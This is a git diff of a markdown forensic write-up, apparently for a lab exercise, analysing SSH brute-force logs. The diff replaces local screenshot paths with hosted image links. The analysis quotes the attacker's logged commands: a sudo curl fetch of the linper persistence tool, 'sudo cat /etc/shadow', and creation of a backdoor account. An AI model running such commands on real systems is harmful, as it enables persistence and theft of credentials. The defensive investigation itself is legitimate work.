@@ -48,9 +48,10 @@ A single IP is responsible for every failed-password attempt — the brute-force
 
 - **Source IP:** `65.2.161.68`
 
-<img width="1887" height="904" alt="03-failed-passwords-root-backup" src="screenshots/03-failed-passwords-root-backup.png" />
+<img width="1887" height="904" alt="03-failed-passwords-root-backup" src="https://github.com/user-attachments/assets/320966ba-2a6b-45be-9548-edf6089a43c6" />
 
-<img width="1907" height="890" alt="02-task1-bruteforce-src_ip" src="screenshots/02-task1-bruteforce-src_ip-65.2.161.68.png" />
+<img width="1907" height="890" alt="02-task1-bruteforce-src_ip-65 2 161 68" src="https://github.com/user-attachments/assets/11448c39-fa19-4486-9967-edcb38e480b2" />
+
 
 ## 3. The Successful Login & the Right Session (Tasks 2 & 4)
 
@@ -74,9 +75,11 @@ source="auth.log" "New session" user=root
 - **Compromised account:** `root`
 - **Attacker's interactive session:** `37`
 
-<img width="1711" height="803" alt="05-accepted-root-session37-context" src="screenshots/05-accepted-root-session37-context.png" />
+<img width="1711" height="803" alt="05-accepted-root-session37-context" src="https://github.com/user-attachments/assets/6ab927ed-bc92-4274-8c8e-6c0350b534e3" />
 
-<img width="1913" height="921" alt="08-new-session-list-6-34-37-49" src="screenshots/08-new-session-list-6-34-37-49.png" />
+
+<img width="1913" height="921" alt="08-new-session-list-6-34-37-49" src="https://github.com/user-attachments/assets/7a3bb5f7-02a0-4fba-83d6-44337b1b6e32" />
+
 
 > Session **6** (06:19:54) predates the brute force entirely and is a legitimate earlier login — not the attacker. Session **34** is the tool's throwaway hit. Only **37** is the human.
 
@@ -106,7 +109,8 @@ At `06:34:18` the attacker created a local account and gave it elevated rights:
 - **New account:** `cyberjunkie`
 - **MITRE sub-technique:** `T1136.001` — Create Account: Local Account
 
-<img width="1904" height="775" alt="10-task5-useradd-cyberjunkie" src="screenshots/10-task5-useradd-cyberjunkie.png" />
+<img width="1904" height="775" alt="10-task5-useradd-cyberjunkie" src="https://github.com/user-attachments/assets/1cb6a2cf-44b6-4941-9cc8-dd9fbd19cd14" />
+
 
 ## 6. Session End & Account Switch (Task 7)
 
@@ -117,7 +121,8 @@ The attacker closed the brute-forced root session and returned through the backd
 
 - **First SSH session end (UTC):** `2024-03-06 06:37:24`
 
-<img width="1908" height="937" alt="09-task7-session37-open-close" src="screenshots/09-task7-session37-open-close.png" />
+<img width="1908" height="937" alt="09-task7-session37-open-close" src="https://github.com/user-attachments/assets/35f1cb2d-0c61-4740-b065-790b788910f7" />
+
 
 ## 7. Privilege Abuse — Script Download (Task 8)
 
@@ -137,7 +142,8 @@ COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/mai
 
 `linper` is a Linux persistence automation tool. The attacker also ran `sudo cat /etc/shadow` at 06:37:57 to dump password hashes.
 
-<img width="1910" height="914" alt="11-task8-cyberjunkie-sudo-curl-linper" src="screenshots/11-task8-cyberjunkie-sudo-curl-linper.png" />
+<img width="1910" height="914" alt="11-task8-cyberjunkie-sudo-curl-linper" src="https://github.com/user-attachments/assets/c7a2c91e-bbb9-4380-b6bb-984cd79228e7" />
+
 
 ---
 
